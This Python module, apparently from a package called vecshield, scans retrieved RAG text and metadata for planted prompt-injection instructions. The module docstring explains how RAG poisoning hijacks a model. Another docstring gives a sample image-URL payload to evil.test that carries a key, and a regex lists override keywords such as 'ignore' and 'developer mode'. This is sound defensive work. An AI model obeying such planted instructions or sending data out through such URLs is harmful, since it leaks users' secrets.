"""Prompt-injection scanner for text that a model will later read.

RAG poisoning: an attacker who can get a document into the knowledge base hides
instructions in it. At query time the chunk is retrieved and pasted into the
LLM context, where the hidden instructions can hijack the model: leak the
system prompt, exfiltrate data, or steer the answer.

This is the signature layer: a precision-leaning rule pack
(:mod:`vecshield.injection.rules`) run over every canonical view of the text
(:mod:`vecshield.injection.canonical`). The score is the summed weight of the
distinct categories that fire (capped at 1.0), so a chunk that both
impersonates the system and asks to exfiltrate scores higher than one doing
either alone. Supporting signals are recorded and add to a real signal, but on
their own never reach the 0.5 threshold.

What it does not do, and says so in ``layers``: it reads signatures, so an
instruction paraphrased beyond the rules, or written in a language without
rules, is not found. A false statement with no instruction in it (knowledge
poisoning) is not an injection and is not looked for here. It raises the cost
of planting an instruction; it is not a boundary, and retrieved text should
still be handled as data.

Coverage is mapped to OWASP LLM01:2025 / LLM08:2025 (indirect injection via
retrieved content) and LLM04:2025 (data and model poisoning) -- in the 2026
edition LLM01:2026 / LLM09:2026 and LLM05:2026, those entries having been
renumbered -- and to MITRE ATLAS AML.T0070 (RAG poisoning) /
AML.T0071 (false RAG entry injection).
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Iterable, Optional
from urllib.parse import parse_qsl, urlsplit

from vecshield.injection import canonical
from vecshield.injection import classifier as classifier_layer
from vecshield.injection.canonical import Budget, View
from vecshield.injection.rules import PACK_VERSION, RULES, SUPPORTING, Rule

#: Characters of one text that are scanned; the rest is reported as not read.
MAX_SCAN_CHARS = 200_000
#: Seconds one scan may take before it stops and says so.
TIME_BUDGET = 2.0

THRESHOLD = 0.5
HIGH_CONFIDENCE = 0.8

#: Categories whose strong rules mean "an instruction aimed at the model".
_DIRECTIVE_CATEGORIES = frozenset({"instruction_override", "system_impersonation",
                                   "exfiltration", "task_hijack", "model_addressing"})

#: The layers a full engine has. This module is the first; the others report
#: ``absent`` until they exist, so a clean result is never read as more than it is.
LAYERS = ("signatures", "similarity", "classifier")


@dataclass
class InjectionResult:
    score: float
    categories: list[str] = field(default_factory=list)
    spans: list[dict] = field(default_factory=list)
    #: A strong directive was found only after undoing an evasion (decoding,
    #: unhiding, folding look-alike letters). Hiding it is evidence of intent.
    hidden_directive: bool = False
    #: The text discusses injection attacks and the match reads as a quoted
    #: example. Still flagged: a quoted payload can act on a model that
    #: retrieves it, and a preamble is cheap for an attacker to add.
    discussed: bool = False
    #: Ids of the rules that fired, in the order they fired.
    rules: list[str] = field(default_factory=list)
    #: Which detection layers ran on this text.
    layers: dict[str, str] = field(default_factory=lambda: {
        "signatures": "ran", "similarity": "absent", "classifier": "absent"})
    #: ``{"scanned_chars", "total_chars"}`` when the text was longer than the limit.
    truncated: Optional[dict] = None
    #: The scan ran out of time and stopped early.
    budget_exhausted: bool = False
    pack_version: str = PACK_VERSION
    #: The score from the rules alone. ``score`` is this unless a classifier
    #: ran, when it is the higher of the two.
    signature_score: float = 0.0
    #: What the classifier said, when one ran: name, revision, probability,
    #: the threshold it flags at, and whether it read the whole text.
    classifier: Optional[dict] = None

    @property
    def is_injection(self) -> bool:
        return self.score >= THRESHOLD

    @property
    def high_confidence(self) -> bool:
        """A flag strong enough to act on: by the rules, never by a model alone.

        A classifier's opinion can flag a text for review. It cannot make a
        flag high-confidence, because nothing in it can be read and checked.
        """
        if not self.is_injection:
            return False
        if self.hidden_directive:
            return True
        return self.signature_score >= HIGH_CONFIDENCE and not self.discussed

    @property
    def verdict(self) -> str:
        """``injection``, ``suspicious`` (flagged, but reads as a quoted example) or ``clean``."""
        if not self.is_injection:
            return "clean"
        return "suspicious" if self.discussed and not self.hidden_directive else "injection"

    @property
    def complete(self) -> bool:
        """Whether the whole text was read by every layer that was asked for."""
        if self.truncated is not None or self.budget_exhausted:
            return False
        if self.layers.get("classifier") == "unavailable":
            return False
        return not (self.classifier and not self.classifier.get("complete", True))

    def to_dict(self) -> dict:
        return {"verdict": self.verdict, "score": self.score, "categories": self.categories,
                "rules": self.rules, "spans": self.spans,
                "hidden_directive": self.hidden_directive, "discussed": self.discussed,
                "high_confidence": self.high_confidence, "layers": dict(self.layers),
                "truncated": self.truncated, "budget_exhausted": self.budget_exhausted,
                "pack_version": self.pack_version,
                "signature_score": self.signature_score, "classifier": self.classifier}


# --------------------------------------------------------------------------- #
# previews                                                                    #
# --------------------------------------------------------------------------- #

_CONTROL = re.compile("[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")


def defang(text: str, limit: int = 80) -> str:
    """A short excerpt of matched text that is safe to store and show.

    Evidence travels: into reports, alerts, tickets, and tools that may hand it
    to a model. An excerpt of an injection is itself an injection unless it is
    made inert, so invisible characters are removed, links and image syntax are
    broken, and markup is neutralised. It is for a person to recognise the
    match, not a faithful copy.
    """
    s = canonical._STRIP.sub("", text)
    s = _CONTROL.sub("", s).replace("\n", " ").strip()
    s = s.replace("](", "] (").replace("<", "‹").replace(">", "›")
    s = s.replace("://", "[:]//")
    return s if len(s) <= limit else s[:limit] + "…"


# --------------------------------------------------------------------------- #
# data carried out in an image URL                                            #
# --------------------------------------------------------------------------- #

_IMAGE_URL = re.compile(
    r"!\[[^\[\]]{0,300}\]\(\s*<?(https?://[^)\s>]{1,2000})|"
    r"<img\b[^<>]{0,500}\bsrc\s*=\s*['\"]?(https?://[^'\"\s>]{1,2000})",
    re.I)
# Signed-URL parameters carry credentials and signatures by design (S3, GCS,
# Azure SAS, CloudFront); an access key id in them is not being smuggled out.
_SIGNED_URL_PARAMS = frozenset({
    "x-amz-credential", "x-amz-signature", "x-amz-security-token", "awsaccesskeyid",
    "signature", "sig", "se", "sv", "sp", "sr", "skoid", "sktid", "googleaccessid",
    "x-goog-credential", "x-goog-signature", "key-pair-id", "policy", "expires",
})
_EXFIL_LABELS = frozenset({"secret", "pci"})
_EXFIL_DETECTORS = frozenset({"email"})
_NOT_EXFIL_DETECTORS = frozenset({"card_like_number"})
_OPAQUE = re.compile(r"^[A-Za-z0-9+/=_.~-]{32,}$")
_classifier = None


def _value_classifier():
    global _classifier
    if _classifier is None:
        from vecshield.classify.regex_classifier import RegexClassifier

        _classifier = RegexClassifier()
    return _classifier


def _image_exfiltration(text: str) -> list[tuple[str, float, str]]:
    """Rendered images whose query string already carries the data.

    The placeholder form ({chat_history}) is a rule. This is the static form:
    `![x](https://evil.test/p.png?d=AKIA...)` exfiltrates the key the moment a
    client renders the answer. A query value that the content classifier
    recognises as a secret, card number or email address is a signal on its
    own; a long opaque value is only supporting, since tracking and
    cache-busting parameters look the same.
    """
    if "http" not in text:
        return []
    out: list[tuple[str, float, str]] = []
    for m in _IMAGE_URL.finditer(text):
        url = m.group(1) or m.group(2)
        try:
            query = parse_qsl(urlsplit(url).query, keep_blank_values=True)
        except ValueError:
            continue
        for name, value in query:
            if name.lower() in _SIGNED_URL_PARAMS or not value:
                continue
            spans = _value_classifier().classify(value).spans or []
            if any((s.get("label") in _EXFIL_LABELS or s.get("detector") in _EXFIL_DETECTORS)
                   and s.get("detector") not in _NOT_EXFIL_DETECTORS for s in spans):
                out.append(("exfiltration", 0.6, defang(f"image URL carries {name}=<sensitive>")))
                return out
            if _OPAQUE.match(value):
                out.append(("exfiltration", SUPPORTING,
                            defang(f"image URL carries opaque {name}=…")))
    return out[:1]


# --------------------------------------------------------------------------- #
# use versus mention                                                          #
# --------------------------------------------------------------------------- #

_DISCUSSION = re.compile(
    r"prompt[- ]injections?|jailbreak(?:ing|s)?|adversarial prompt\w*|prompt[- ]leak\w*|"
    r"indirect injection|injection attacks?|red[- ]team\w*|\battack(?:er|ers|s)?\b|"
    r"vulnerabilit\w+|malicious (?:prompt|instruction|input|user)s?|guardrails?|"
    r"mitigat\w+|\bOWASP\b|\bLLM0\d\b|exploit\w*|threat model\w*|untrusted (?:input|data)",
    re.I)


def _discussed(text: str, positions: Iterable[tuple[int, int]]) -> bool:
    """Whether the text is about injection and the matches sit in that discussion.

    Two different discussion terms must appear, and one within 600 characters
    of a match. A document that only quotes a payload does not qualify.
    """
    terms = {m.group(0).lower() for m in _DISCUSSION.finditer(text)}
    if len(terms) < 2:
        return False
    for start, end in positions:
        if _DISCUSSION.search(text, max(0, start - 600), min(len(text), end + 600)):
            return True
    return False


# --------------------------------------------------------------------------- #
# the scan                                                                    #
# --------------------------------------------------------------------------- #

_HIDDEN_KEYWORDS = re.compile(r"ignore|system prompt|new instructions?|developer mode", re.I)


#: Sentinel: use the classifier configured in the environment, if any.
ENVIRONMENT = "environment"


def classifier_score(probability: float, threshold: float) -> float:
    """A classifier's probability on the scanner's scale, where 0.5 flags.

    Monotone, so ranking by it is ranking by the probability; the threshold
    lands on 0.5, so one flagging rule serves both layers.
    """
    if probability >= threshold:
        return 0.5 + 0.5 * (probability - threshold) / max(1.0 - threshold, 1e-9)
    return 0.5 * probability / threshold


def scan_text(text: str | None, *, rules: tuple[Rule, ...] = RULES,
              max_chars: int = MAX_SCAN_CHARS,
              time_budget: float | None = TIME_BUDGET,
              classifier: object = ENVIRONMENT) -> InjectionResult:
    """Scan one text for instructions placed for the model that will read it.

    ``classifier`` is an :class:`~vecshield.injection.classifier.OnnxClassifier`,
    ``None`` for the rules alone, or (the default) whatever the environment
    configures, which is nothing unless ``VECSHIELD_INJECTION_MODEL_DIR`` is set.
    """
    if not text:
        return InjectionResult(0.0)

    truncated = None
    if len(text) > max_chars:
        truncated = {"scanned_chars": max_chars, "total_chars": len(text)}
        text = text[:max_chars]

    budget = Budget(time_budget)
    by_category: dict[str, float] = {}
    spans: list[dict] = []
    fired: list[str] = []
    matched: set[str] = set()
    raw_positions: list[tuple[int, int]] = []
    all_positioned = True
    hidden_directive = False

    def hit(category: str, weight: float) -> None:
        by_category[category] = max(by_category.get(category, 0.0), weight)

    def run(view: View, *, hidden_view: bool = False) -> None:
        nonlocal hidden_directive, all_positioned
        primary_before = set(_primary(by_category))
        lowered = view.text.lower()
        for rule in rules:
            if rule.id in matched:
                continue
            if rule.gate is not None and not any(word in lowered for word in rule.gate):
                continue
            if rule.requires is not None and not any(w in lowered for w in rule.requires):
                continue
            if budget.spent():
                return
            m = rule.pattern.search(view.text)
            if not m:
                continue
            matched.add(rule.id)
            fired.append(rule.id)
            hit(rule.category, rule.weight)
            span = {"rule": rule.id, "category": rule.category, "weight": rule.weight,
                    "preview": defang(m.group(0))}
            if not rule.reviewed:
                span["unreviewed"] = True
            position = _position(view, m.start(), m.end())
            if view.label != "raw":
                span["transform"] = view.label
                if view.chain:
                    span["chain"] = list(view.chain)
            if position:
                span["start"], span["end"] = position
                if not rule.supporting:
                    raw_positions.append(position)
            elif not rule.supporting:
                all_positioned = False
            if ((view.reveals or hidden_view) and rule.category in _DIRECTIVE_CATEGORIES
                    and rule.weight >= 0.5):
                hidden_directive = True
            spans.append(span)
        if view.evasion and set(_primary(by_category)) - primary_before:
            hit(view.evasion, 0.4)

    for view in canonical.views(text, budget):
        run(view)
        if budget.spent():
            break

    # Markup a reader does not see: its presence is a signal, and what it says
    # is scanned as a reading of its own. A directive already matched in the
    # text as written is hidden too, if where it matched lies inside the markup.
    def mark_hidden_markup(segment) -> None:
        if "hidden.markup" in matched:
            return
        matched.add("hidden.markup")
        fired.append("hidden.markup")
        hit("hidden_content", 0.45)
        spans.append({"rule": "hidden.markup", "category": "hidden_content",
                      "weight": 0.45, "start": segment.start, "end": segment.end,
                      "preview": defang(text[segment.start:segment.end])})

    for segment in canonical.hidden_segments(text):
        if budget.spent():
            break
        if segment.kind == "hidden_element" or (
                segment.kind == "comment" and _HIDDEN_KEYWORDS.search(segment.text)):
            mark_hidden_markup(segment)
        before = len(spans)
        run(View(f"hidden_{segment.kind}", segment.text,
                 source_span=(segment.start, segment.end)), hidden_view=True)
        inside = [s for s in spans[:before]
                  if s.get("weight", 0) > SUPPORTING and "transform" not in s
                  and s.get("start") is not None
                  and segment.start <= s["start"] and s["end"] <= segment.end
                  and s["rule"] != "hidden.markup"]
        if any(s["category"] in _DIRECTIVE_CATEGORIES and s["weight"] >= 0.5 for s in inside):
            hidden_directive = True
        if not hidden_directive:
            # The same directive may also appear in plain view, where its rule
            # already fired. The hidden copy still counts as hidden.
            lowered = segment.text.lower()
            for rule in rules:
                if (rule.category in _DIRECTIVE_CATEGORIES and rule.weight >= 0.5
                        and (rule.gate is None or any(w in lowered for w in rule.gate))
                        and (rule.requires is None
                             or any(w in lowered for w in rule.requires))
                        and rule.pattern.search(segment.text)):
                    hidden_directive = True
                    inside.append({"rule": rule.id})
                    break
        if inside or any(s.get("weight", 0) > SUPPORTING for s in spans[before:]):
            mark_hidden_markup(segment)

    for category, weight, preview in _image_exfiltration(text):
        hit(category, weight)
        spans.append({"rule": "exfil.image_static", "category": category, "weight": weight,
                      "preview": preview})
        fired.append("exfil.image_static")

    if not text.isascii():
        if canonical.INVISIBLE.search(text) and canonical.INVISIBLE.search(
                canonical.without_benign_invisibles(text)):
            hit("encoding_evasion", SUPPORTING)
            spans.append({"rule": "evasion.invisible_characters", "category": "encoding_evasion",
                          "weight": SUPPORTING, "preview": "<invisible chars>"})
        if canonical.BIDI_CONTROL.search(text):
            hit("encoding_evasion", SUPPORTING)
            spans.append({"rule": "evasion.bidi_controls", "category": "encoding_evasion",
                          "weight": SUPPORTING, "preview": "<bidi controls>"})
        if canonical.mixed_script_tokens(canonical.normalize(text)[0]):
            hit("encoding_evasion", SUPPORTING)
            spans.append({"rule": "evasion.mixed_script_word", "category": "encoding_evasion",
                          "weight": SUPPORTING, "preview": "<mixed-script word>"})

    primary = _primary(by_category)
    if primary:
        score = min(1.0, sum(by_category.values()))
    else:
        # Supporting signals alone describe the chunk; they cannot flag it. More
        # of them rank it higher among the unflagged, always under the threshold.
        supporting = sum(1 for span in spans if span["weight"] <= SUPPORTING)
        score = (min(SUPPORTING + 0.05 * (supporting - 1), THRESHOLD - 0.05)
                 if supporting else 0.0)
    signature_score = round(score, 3)
    signature_flagged = signature_score >= THRESHOLD
    # Only a match in the text as written can be a quotation. One that had to
    # be decoded or unhidden is never excused as an example.
    discussed = (signature_flagged and not hidden_directive and all_positioned
                 and bool(raw_positions) and _discussed(text, raw_positions))

    layers = {"signatures": "ran", "similarity": "absent", "classifier": "absent"}
    opinion: Optional[dict[str, Any]] = None
    model: Any
    model, error = (classifier_layer.default_classifier() if classifier is ENVIRONMENT
                    else (classifier, None))
    if error:
        layers["classifier"] = "unavailable"
        opinion = {"error": error, "complete": False}
    elif model is not None:
        opinion = _second_opinion(model, text)
        layers["classifier"] = opinion.pop("status")
        if layers["classifier"] == "ran":
            mapped = classifier_score(opinion["probability"], opinion["threshold"])
            score = max(score, mapped)
            if opinion["probability"] >= opinion["threshold"]:
                by_category["classifier"] = round(mapped, 3)
                fired.append(f"classifier:{opinion['name']}")
                span = {"rule": f"classifier:{opinion['name']}", "category": "classifier",
                        "weight": round(mapped, 3),
                        "probability": round(opinion["probability"], 4),
                        "preview": defang(opinion.pop("excerpt", ""))}
                if opinion.get("span"):
                    span["start"], span["end"] = opinion["span"]
                spans.append(span)
            opinion.pop("excerpt", None)

    return InjectionResult(
        score=round(score, 3),
        categories=sorted(by_category.keys()),
        spans=spans,
        hidden_directive=hidden_directive and signature_flagged,
        discussed=discussed,
        rules=fired,
        layers=layers,
        truncated=truncated,
        budget_exhausted=budget.exhausted,
        signature_score=signature_score,
        classifier=opinion,
    )


def _second_opinion(model: Any, text: str) -> dict[str, Any]:
    """What the classifier makes of the canonical reading of ``text``."""
    reading, offsets = canonical.reading(text)
    info: dict[str, Any] = {"name": model.name, "revision": model.spec.revision,
                            "threshold": model.threshold}
    if model.spec.languages is not None:
        from vecshield.classify.language import detect

        language = detect(reading)
        if not model.reads(language):
            return {**info, "status": "not_applicable", "complete": True,
                    "reason": f"the model does not read '{language}'"}
    try:
        out = model.score(reading)
    except Exception as exc:  # noqa: BLE001 - a failed layer is reported, never a pass
        return {**info, "status": "unavailable", "complete": False,
                "error": type(exc).__name__}
    span = out["span"]
    excerpt = reading[span[0]:span[1]] if span else ""
    if span and offsets is not None and span[1] - 1 < len(offsets):
        span = (offsets[span[0]], offsets[span[1] - 1] + 1)
    elif span and reading != text:
        span = None                      # positions are in the reading, not the text
    return {**info, "status": "ran", "probability": out["probability"],
            "windows": out["windows"], "complete": out["complete"], "span": span,
            "excerpt": excerpt}


def _position(view: View, start: int, end: int) -> tuple[int, int] | None:
    if view.label == "raw":
        return start, end
    if view.offsets is not None and end - 1 < len(view.offsets):
        return view.offsets[start], view.offsets[end - 1] + 1
    return view.source_span


def _primary(by_category: dict[str, float]) -> dict[str, float]:
    return {c: w for c, w in by_category.items() if w > SUPPORTING}


def _metadata_strings(value: Any) -> list[str]:
    if isinstance(value, str):
        return [value]
    if isinstance(value, list):
        return [v for v in value if isinstance(v, str)]
    return []


def scan_surfaces(text: str | None, metadata: Optional[dict[str, Any]] = None, *,
                  max_chars: int = MAX_SCAN_CHARS,
                  time_budget: float | None = TIME_BUDGET,
                  classifier: object = ENVIRONMENT) -> tuple[dict | None, bool]:
    """Scan a chunk's text and its string metadata. Returns ``(hit, partly scanned)``.

    Metadata is scanned because it is retrieved and shown to the model with the
    text. ``partly scanned`` is true when a surface was longer than the scan
    limit or its scan ran out of time, so a caller can record that instead of
    letting the unread part pass as inspected.
    """
    surfaces: list[tuple[str, str]] = []
    if text:
        surfaces.append(("text", text))
    for key, value in (metadata or {}).items():
        for item in _metadata_strings(value):
            surfaces.append((f"metadata.{key}", item))

    hits: list[dict] = []
    categories: set[str] = set()
    rules: list[str] = []
    max_score = 0.0
    high_confidence = False
    quoted_only = True
    partial = False
    layers: dict[str, str] = {}
    for surface, value in surfaces:
        result = scan_text(value, max_chars=max_chars, time_budget=time_budget,
                           classifier=classifier)
        # A classifier that could not be loaded is reported through ``layers``;
        # ``partial`` is about text a layer that ran did not reach.
        partial = (partial or result.truncated is not None or result.budget_exhausted
                   or bool(result.layers.get("classifier") == "ran" and result.classifier
                           and not result.classifier.get("complete", True)))
        layers = result.layers
        if not result.is_injection:
            continue
        max_score = max(max_score, result.score)
        high_confidence = high_confidence or result.high_confidence
        quoted_only = quoted_only and result.verdict == "suspicious"
        categories.update(result.categories)
        rules.extend(r for r in result.rules if r not in rules)
        for span in result.spans[:3]:
            enriched = dict(span)
            enriched["surface"] = surface
            hits.append(enriched)

    if not categories:
        return None, partial
    return {
        "score": round(max_score, 3),
        "confidence": "high" if high_confidence else "medium",
        "verdict": "suspicious" if quoted_only else "injection",
        "categories": sorted(categories),
        "rules": rules,
        "surfaces": sorted({h["surface"] for h in hits}),
        "spans": hits,
        "pack_version": PACK_VERSION,
        "layers": layers,
    }, partial
